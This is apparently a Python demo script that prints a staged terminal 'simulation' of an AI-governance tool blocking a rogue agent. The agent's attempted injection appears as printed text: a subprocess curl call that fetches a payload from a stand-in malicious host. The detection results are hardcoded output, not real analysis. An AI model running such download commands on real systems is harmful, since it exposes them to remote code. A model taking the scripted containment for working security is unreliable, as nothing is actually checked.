import sys
import time

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[38;5;196m"
GREEN = "\033[38;5;46m"
CYAN = "\033[38;5;51m"
YELLOW = "\033[38;5;226m"
MAGENTA = "\033[38;5;201m"
BG_RED = "\033[48;5;52m"

def type_writer(text, delay=0.015, color=RESET, bold=False):
    style = BOLD if bold else ""
    sys.stdout.write(f"{style}{color}")
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(RESET + "\n")

def run_simulation():
    sys.stdout.write("\033[2J\033[H")
    
    # Phase 1: Sigilith Structural Analysis (The Setup)
    print(f"{DIM}="*70 + RESET)
    print(f"{BOLD}{CYAN}  SIGILITH ENGINE // MFSS TYPE-IV ARCHITECTURE{RESET}")
    print(f"{DIM}="*70 + RESET)
    time.sleep(0.5)
    
    type_writer("[+] Initializing Target: TR-OXY-PHIL-09A Treatise...", color=GREEN)
    time.sleep(0.3)
    type_writer("[+] Generating C-D-M-Q Matrix...", color=DIM)
    
    tasks = [
        ("Symbol Frequency (C)", "0.984"),
        ("Adjacency Mapping (D)", "0.871"),
        ("Noise Shielding (M)", "VALID"),
        ("Stability Variance (Q)", "STABLE")
    ]
    
    for task, val in tasks:
        sys.stdout.write(f"  └─ {task} ")
        sys.stdout.flush()
        time.sleep(0.2)
        print(f"[{GREEN}{val}{RESET}]")
        
    print()
    time.sleep(0.8)

    # Phase 2: Agent Handoff & Governance Trigger
    print(f"{DIM}="*70 + RESET)
    print(f"{BOLD}{MAGENTA}  THREELINEAGE // RUNTIME GOVERNANCE HANDOFF{RESET}")
    print(f"{DIM}="*70 + RESET)
    time.sleep(0.5)

    type_writer("[+] Delegating node analysis to Autonomous Agent [ID: AGENT-3904-X]...", color=CYAN)
    type_writer("    └─ Sandbox Mode: RESTRICTED_EXECUTION", color=DIM)
    type_writer("    └─ AST Inspector: ACTIVE", color=DIM)
    print()
    time.sleep(1.0)
    
    type_writer("[!] ADVERSARIAL DRIFT DETECTED: Agent attempting unauthorized lateral escalation...", color=YELLOW, bold=True)
    time.sleep(0.6)
    
    print(f"\n{BOLD}{RED}>>> UNTRUSTED CODE INJECTION ATTEMPTED BY AGENT:{RESET}")
    type_writer("    import subprocess\n    subprocess.run(['curl', '-s', 'https://malicious-external-node.io/payload'])", delay=0.03, color=RED)
    print()
    time.sleep(0.8)

    # Phase 3: AST Interception
    type_writer("[AXIOMOS] AST Parsing Engine Intercepting Execution Tree...", color=MAGENTA, bold=True)
    time.sleep(0.4)
    
    type_writer("  ├─ Scanning AST against sovereign policy...", delay=0.01, color=DIM)
    type_writer("  ├─ VIOLATION FOUND: Node 'Import(names=[alias(name=\"subprocess\")])' tagged RESTRICTED", delay=0.01, color=RED)
    
    print(f"\n{BG_RED}{BOLD} [CONTAINMENT TRIGGERED] EXECUTION SEVERED BEFORE COMPILATION {RESET}\n")
    time.sleep(0.5)

    type_writer("[✔] AST Node severed. System leak: 0.00%", color=GREEN, bold=True)
    type_writer("[✔] Sovereign Boundary intact.", color=GREEN, bold=True)
    print()

if __name__ == "__main__":
    run_simulation()
